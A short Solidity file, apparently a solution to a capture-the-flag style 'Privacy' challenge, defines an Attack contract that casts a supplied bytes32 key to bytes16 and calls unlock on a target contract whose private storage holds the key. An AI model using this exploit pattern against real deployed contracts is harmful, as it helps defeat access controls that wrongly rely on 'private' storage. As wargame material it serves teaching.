// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Privacy.sol";

contract Attack {
    Privacy public privacyContract;

    constructor(address _privacyContract) {
        privacyContract = Privacy(_privacyContract);
    }

    function attack(bytes32 _key) public {
        // bytes32 key;
        // // converts string into bytes 32
        // assembly {
        //     key := mload(add(_key, 32))
        // }

        // converts bytes32 to bytes16
        bytes16 finalKey = bytes16(_key);
        privacyContract.unlock(finalKey);
    }
}
